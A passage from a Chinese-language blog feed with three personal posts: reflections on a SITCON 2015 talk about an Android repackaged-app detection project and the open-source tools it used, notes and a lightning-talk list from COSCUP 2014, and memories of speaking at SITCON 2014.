現在回頭過來其實蠻後悔自己沒有認真把那些前人的智慧化為己用&lt;br /&gt;
是時候趁著這股動力和熱血 把那些遺忘的觀念複習一下了&lt;br /&gt;
偷偷附上一張與 jserv 的合照&lt;br /&gt;
&lt;img alt="with jserv" src="/files/sitcon-2015-android-repackaged-app-detection-system/jserv.jpg" /&gt;&lt;br /&gt;
圖片原連結：&lt;a href="https://www.flickr.com/photos/sitcon/16818827202/in/set-72157649003614643"&gt;https://www.flickr.com/photos/sitcon/16818827202/in/set-72157649003614643&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;雖然第一年因為幫忙 Open House 而沒參與到 SITCON (當時還在台科大舉辦)&lt;br /&gt;
但第二屆和第三屆都有幸成為講者&lt;br /&gt;
也許也是最後一次了吧&lt;br /&gt;
目前沒有繼續往研究所升學的打算&lt;br /&gt;
大概今年就要去從容就義 報效國家了XD&lt;br /&gt;
真的希望資訊教育能夠持續的推廣下去  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;關於本次的 Talk&lt;/h2&gt;
&lt;h3&gt;Android Repackaged App Detection System&lt;/h3&gt;
&lt;p&gt;本次演講的投影片在此&lt;br /&gt;
&lt;a href="https://speakerdeck.com/m157q/sitcon2015-android-repackaged-app-detection-system-by-shunyi"&gt;https://speakerdeck.com/m157q/sitcon2015-android-repackaged-app-detection-system-by-shunyi&lt;/a&gt;&lt;br /&gt;
&lt;script async class="speakerdeck-embed" data-id="6ab309bf1d5f42ecbeb4bace486631e8" data-ratio="1.33333333333333" src="//speakerdeck.com/assets/embed.js"&gt;&lt;/script&gt;  &lt;/p&gt;
&lt;p&gt;主要就是介紹在大學時做的專題&lt;br /&gt;
因為嘗試將許多現有的開放原始碼軟體整合起來&lt;br /&gt;
剛好跟今年的主題 The Ture Hacker 相呼應&lt;br /&gt;
投影片裡也有提到原因&lt;br /&gt;
主要就是 esr (&lt;a href="http://en.wikipedia.org/wiki/Eric_S._Raymond"&gt;Eric S. Raymond - Wikipedia, the free encyclopedia&lt;/a&gt;)&lt;br /&gt;
在網路上的一篇知名文章 &lt;a href="http://www.catb.org/esr/faqs/hacker-howto.html"&gt;How To Become A Hacker&lt;/a&gt;&lt;br /&gt;
裡頭提到了  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;No problem should ever have to be solved twice.&lt;/strong&gt;&lt;br /&gt;
Creative brains are a valuable, limited resource.&lt;br /&gt;
They shouldn't be wasted on re-inventing the wheel when there are so many fascinating new problems waiting out there.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這個專題真的結合了很多現有的 Open Source 專案去達到我們想做的事&lt;br /&gt;
最後一頁的投影片列出了所有用到的 Open Source 專案&lt;br /&gt;
過程中也學到了很多東西&lt;br /&gt;
Dalvik, smali, baksmali, Data Dependence, Flow Dependence, ...&lt;br /&gt;
嘗試了很多語言和相關的專案  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Perl  &lt;/li&gt;
&lt;li&gt;Python  &lt;ul&gt;
&lt;li&gt;Scrapy  &lt;/li&gt;
&lt;li&gt;NetworkX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Java  &lt;ul&gt;
&lt;li&gt;Unofficial Google Play API  &lt;/li&gt;
&lt;li&gt;SAAF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JavaScript  &lt;ul&gt;
&lt;li&gt;Node.js  &lt;/li&gt;
&lt;li&gt;D3.js  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其實中間也 survey 了很多不同的工具&lt;br /&gt;
雖然最後沒有採用&lt;br /&gt;
依稀記得的有&lt;br /&gt;
Wala, graph-tool 以及各種 Unofficial Android third party marketplace API&lt;br /&gt;
也很感謝陳仲寬學長在這過程之中給我們很大的幫忙&lt;br /&gt;
無論是在傳授給我們相關的知識亦或是給予我們相關論文來閱讀&lt;br /&gt;
還有國科會計劃申請書的參考範本也是來自學長當年的申請書  &lt;/p&gt;
&lt;p&gt;雖然這個專案離我們當初構想的最後完成體還差的有點多&lt;br /&gt;
原本預計還要加入 Machine Learning 讓判斷相似度的部分可以更自動及更有系統地分析&lt;br /&gt;
以及想要利用 Open Stack 亦或是 Docker 進行部署&lt;br /&gt;
採用雲端運算加快相似度比對的速度&lt;br /&gt;
這些都因為自身能力不足&lt;br /&gt;
而無法如期的完成到這個部分&lt;br /&gt;
老實說 就連相似度的 threshold 要訂在哪我們都還不是很有把握  &lt;/p&gt;
&lt;p&gt;話說國科會計劃的結報好像也快到了該交出的死線日期了&lt;br /&gt;
至少三月底前要交出吧？&lt;br /&gt;
希望可以利用這幾天的時間把結報寫一寫&lt;br /&gt;
然後把 Source Code 整理後釋出&lt;br /&gt;
因為要用到各種不同的 Open Source Project&lt;br /&gt;
所以開始學習怎麼用 git submodule&lt;br /&gt;
Python 純粹是因為個人喜好所以採用&lt;br /&gt;
而 JavaScript 則是當時想碰 所以就用了&lt;br /&gt;
也感謝我的好夥伴兼好室友江泓樂配合我採用各種程式語言的任性&lt;br /&gt;
感謝強者小樂常常在看論文方面給我蠻大的幫助&lt;br /&gt;
因為我不是那麼喜歡看論文XDrz&lt;br /&gt;
以及在我大三同時兼任&lt;br /&gt;
系計中助教、Open House 資訊組組長、網路福利社社長、汪汪社副社長&lt;br /&gt;
還修了一堆課 忙碌到擠不出什麼時間 導致有時無故缺席 meeting 的時候&lt;br /&gt;
還能包容我 告訴我預計的進度應該到哪  &lt;/p&gt;
&lt;p&gt;Trace 許多 Source Code 之後&lt;br /&gt;
仍然深深感到自己的能力不足&lt;br /&gt;
看 Code 及理解 Code 的速度不夠快&lt;br /&gt;
在自己撰寫程式碼的方面&lt;br /&gt;
也明顯感受到了開發經驗與速度的不足&lt;br /&gt;
各種方面都還有待加強  &lt;/p&gt;
&lt;p&gt;在農曆新年後 以這場 Talk 作為新年的開始&lt;br /&gt;
希望新的一年 自己也能不斷地學習新的知識&lt;br /&gt;
把想唸的書唸完 繼續增強自己的開發能力&lt;br /&gt;
向那些 True Hackers 看齊 利用自己所掌握的資訊開發能力&lt;br /&gt;
努力讓這個世界變得更好  &lt;/p&gt;
&lt;p&gt;寫到這邊突然好想再重看一次&lt;a href="http://www.books.com.tw/products/0010548392"&gt;黑客列傳：電腦革命俠客誌(25週年紀念版)&lt;/a&gt;&lt;br /&gt;
讓自己回到半世紀前 感受當時那些時代先驅們的熱血精神  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;SITCON 2015 相簿連結&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.flickr.com/photos/sitcon/sets/72157649003614643/"&gt;Sitcon 2015 - an album on Flickr&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.flickr.com/photos/sitcon/sets/72157649027037894/"&gt;Sitcon2015 幕後花絮 - an album on Flickr&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.flickr.com/photos/sitcon/sets/72157650915441780/"&gt;SITCON2015 by 海哥 - an album on Flickr&lt;/a&gt; // 這個拍超多妹子...  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Conf"></category><category term="SITCON"></category><category term="Python"></category><category term="Perl"></category><category term="Java"></category><category term="JavaScript"></category><category term="Scrapy"></category><category term="NetworkX"></category><category term="SAAF"></category><category term="node.js"></category><category term="d3.js"></category><category term="Android"></category><category term="Note"></category><category term="Thought"></category></entry><entry><title>COSCUP 2014 Notes and Thoughts</title><link href="https://blog.m157q.tw/posts/2014/07/20/coscup-2014-notes-and-thoughts/" rel="alternate"></link><published>2015-10-28T12:55:00+08:00</published><updated>2015-10-28T12:55:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-07-20:posts/2014/07/20/coscup-2014-notes-and-thoughts/</id><summary type="html">&lt;p&gt;前面是有點長的廢話:  &lt;/p&gt;
&lt;p&gt;今年的日期和 HITCON 對調，改到了七月  &lt;/p&gt;
&lt;p&gt;報到使用了感應式門框 速度超級快  &lt;/p&gt;
&lt;p&gt;上千人報到也都不用等 真的很棒  &lt;/p&gt;
&lt;p&gt;最近的 Conf 都是 IRC(看即時狀況) + Hackpad(筆記)  &lt;/p&gt;
&lt;p&gt;但 Hackpad 對中文輸入的支援實在還是沒有很好  &lt;/p&gt;
&lt;p&gt;所以除了打 code 跟 英文筆記以外 我實在不太想用 hackpad  &lt;/p&gt;
&lt;p&gt;不知道哪時候才有辦法解決這種共筆網站的輸入問題  &lt;/p&gt;
&lt;p&gt;google drive 似乎就沒有這個問題的樣子  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;今年最紅的應該就是桌機哥了吧&lt;br /&gt;
&lt;img alt="桌機哥" src="/files/coscup-2014-notes-and-thoughts/desktop-bro.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;不但被人 &lt;a href="http://www.plurk.com/p/k81ob1"&gt;拍照放到噗浪上&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;還成立了 &lt;a href="https://www.facebook.com/pages/%E6%A1%8C%E6%A9%9F%E5%93%A5/742954022410671"&gt;Facebook 粉絲團&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;不知道會不會掀起自帶主機和螢幕參加 conf 的風潮  &lt;/p&gt;
&lt;p&gt;梗的話就參考 &lt;a href="https://coscup.hackpad.com/COSCUP2014--9DNfsNGRcZX"&gt;hackpad 的梗全集&lt;/a&gt; 吧  &lt;/p&gt;
&lt;p&gt;但應該還是有很多散落在 irc log 和共筆中  &lt;/p&gt;
&lt;p&gt;今年還是一樣沒認識什麼人  &lt;/p&gt;
&lt;p&gt;大概就是個性使然  &lt;/p&gt;
&lt;p&gt;明年想找機會投稿  &lt;/p&gt;
&lt;p&gt;沒機會投稿也要弄個貢獻者專案拿票  &lt;/p&gt;
&lt;p&gt;不想再搶票啦!  &lt;/p&gt;
&lt;p&gt;不過近年來好像真的都是以推廣和發表新作品居多  &lt;/p&gt;
&lt;p&gt;--廠商的贊助廣告也越來越多啦 滿滿整個小袋子--  &lt;/p&gt;
&lt;p&gt;看來要比較多技術性還是得期待 OSDC  &lt;/p&gt;
&lt;p&gt;但是我這種小廢物去 OSDC 的時候又覺得有些聽不太懂  &lt;/p&gt;
&lt;p&gt;所以還是努力加強自己的實力吧...  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;嗯 廢話完畢  &lt;/p&gt;
&lt;p&gt;所有相關共筆可以參考 &lt;a href="https://coscup.hackpad.com"&gt;https://coscup.hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;或是直接看 &lt;a href="http://hackfoldr.org/coscup2014"&gt;hack folder 整合&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;有現場聽的議程我幾乎都有在 hackpad 做共筆  &lt;/p&gt;
&lt;p&gt;(雖然常常當掉要一直狂 refresh 但還是覺得就是應該用共同筆記 而不是自己弄自己的 這樣才有 Open Source 的感覺啊)  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Lightning Talks&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;數位時代  &lt;ul&gt;
&lt;li&gt;感應門報到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;hlb  &lt;ul&gt;
&lt;li&gt;KKTIX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OpenATC  &lt;ul&gt;
&lt;li&gt;http://www.openatc.club/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;penk  &lt;ul&gt;
&lt;li&gt;https://github.com/penk/terrarium-app  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;COSCUP 的便當  &lt;ul&gt;
&lt;li&gt;http://shiapic.loliconis.me/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;KDockerWeb - Docker Web 管理界面  &lt;ul&gt;
&lt;li&gt;https://github.com/tsaikd/kdocker-web  &lt;/li&gt;
&lt;li&gt;http://tsaikd.org/kdocker-web/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;硬是要 69 - YuTin  &lt;ul&gt;
&lt;li&gt;66K - xdite  &lt;/li&gt;
&lt;li&gt;67K - tirky  &lt;/li&gt;
&lt;li&gt;69K 因為我愛 69 !  &lt;ul&gt;
&lt;li&gt;Google Forms  &lt;/li&gt;
&lt;li&gt;Google Public API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;攝護線  &lt;ul&gt;
&lt;li&gt;大腸花、白色正義協助直播  &lt;/li&gt;
&lt;li&gt;要突破警察的黑畫面  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.inlive.tw"&gt;http://www.inlive.tw&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Open Source Job Board - Sammy Fung  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/sammyfung/drupal7-job"&gt;https://github.com/sammyfung/drupal7-job&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自己的遊戲產業自己救 - Johnson Lin  &lt;ul&gt;
&lt;li&gt;我的 Open Office crash 啦  &lt;ul&gt;
&lt;li&gt;imacat 上去救援  &lt;/li&gt;
&lt;li&gt;又 crash 啦  &lt;/li&gt;
&lt;li&gt;NOTO SANS 字體會讓 Open Office 當掉  &lt;/li&gt;
&lt;li&gt;https://github.com/adobe-fonts/source-han-sans/issues/27  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;https://igdshare.org/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Firfox Appmaker - orinx  &lt;ul&gt;
&lt;li&gt;Webmaker &lt;a href="https://webmaker.org/"&gt;https://webmaker.org/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Appmaker &lt;a href="https://apps.webmaker.org/designer"&gt;https://apps.webmaker.org/designer&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;疑似 NG0 案例分享 - 雨蒼  &lt;ul&gt;
&lt;li&gt;公民 1985 行動聯盟 - 國會調查兵團  &lt;ul&gt;
&lt;li&gt;PTT 上號昭  &lt;/li&gt;
&lt;li&gt;Skype 開會  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;影片真的超有梗  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;iHaskell - carlsu  &lt;ul&gt;
&lt;li&gt;https://github.com/gibiansky/IHaskell  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我們能有文化的編程 - 大媽  &lt;ul&gt;
&lt;li&gt;我沒有幻燈，你拔不到我的線  &lt;/li&gt;
&lt;li&gt;我們都是碼農，我們都是程序猿  &lt;/li&gt;
&lt;li&gt;已經開始自稱碼畜了  &lt;/li&gt;
&lt;li&gt;如何提高我們程序猿的逼格？  &lt;/li&gt;
&lt;li&gt;Knuth  &lt;ul&gt;
&lt;li&gt;The Art Of Programming  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Literate_programming"&gt;Literate Programming&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Python Leo  &lt;/li&gt;
&lt;li&gt;在這個編程環境中，我感覺我真的有文化了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[加碼] 桌機哥  &lt;ul&gt;
&lt;li&gt;明年有考慮辦桌機 Bof 嗎?  &lt;/li&gt;
&lt;li&gt;有人跟我一樣帶桌機的話可以考慮  &lt;/li&gt;
&lt;li&gt;什麼因緣下讓你帶桌機來?  &lt;/li&gt;
&lt;li&gt;就...剛好沒有筆電可以用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary><category term="Conf"></category><category term="Taiwan"></category><category term="COSCUP"></category><category term="Open Source"></category><category term="Note"></category><category term="Thought"></category></entry><entry><title>SITCON 2014 - 一年半前不會寫網站的菜鳥的故事</title><link href="https://blog.m157q.tw/posts/2014/03/16/sitcon-2014-yi-nian-ban-qian-bu-hui-xie-wang-zhan-de-cai-niao-de-gu-shi/" rel="alternate"></link><published>2015-10-28T12:56:00+08:00</published><updated>2015-10-28T12:56:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-03-16:posts/2014/03/16/sitcon-2014-yi-nian-ban-qian-bu-hui-xie-wang-zhan-de-cai-niao-de-gu-shi/</id><summary type="html">&lt;h2&gt;Slides on Speaker Deck&lt;/h2&gt;
&lt;script async class="speakerdeck-embed" data-id="45b691608e54013146051a945ae20cc0" data-ratio="1.33333333333333" src="//speakerdeck.com/assets/embed.js"&gt;&lt;/script&gt;

&lt;hr /&gt;
&lt;h2&gt;Thought&lt;/h2&gt;
&lt;p&gt;去年第一屆 SITCON (2013) 沒搶到票，&lt;br /&gt;
有人送票給我以後，我卻突然臨時有事不能去。&lt;br /&gt;
今年因為怕搶不到票的悲劇重新上演，就想說直接來投稿好了。&lt;br /&gt;
投稿者會得到一組 VIP Code，不用搶票。&lt;br /&gt;
(其實我忘記去年十月參加 &lt;a href="http://hackgen.sitcon.org/"&gt;HackGen&lt;/a&gt;，會贈送一組 VIP Code 了)  &lt;/p&gt;
&lt;p&gt;結果2月中旬左右就被通知投稿被選上了，&lt;br /&gt;
在 SITCON 2014 當天要在中研院講一場。&lt;br /&gt;
蠻開心也蠻緊張的，以前來中研院都是坐在台下，看台上人演講，&lt;br /&gt;
這次要換自己體驗一下站在台上的感覺。  &lt;/p&gt;
&lt;p&gt;SITCON 2014 網路報名當天，&lt;br /&gt;
想說還是來試試看這次的票好不好搶，&lt;br /&gt;
結果因為 &lt;a href="https://kktix.com/"&gt;KKTIX&lt;/a&gt; (前身為 Registrano)&lt;br /&gt;
的售票機制和以往不同，&lt;br /&gt;
導致這次的票根本不用用搶的，&lt;br /&gt;
我連開好幾個分頁就拿了 4~5 張，&lt;br /&gt;
於是開始送票給社團的學弟妹和忘記搶票的人，&lt;br /&gt;
並擅自把 SITCON 訂為社團出遊日 XDDD&lt;br /&gt;
--絕對不是要他們來看我演講--&lt;br /&gt;
最後也在報名截止前兩天，&lt;br /&gt;
把手上的兩組 VIP Code 送出去給有需要的人  &lt;/p&gt;</summary><category term="Conf"></category><category term="Web"></category><category term="SITCON"></category></entry></feed>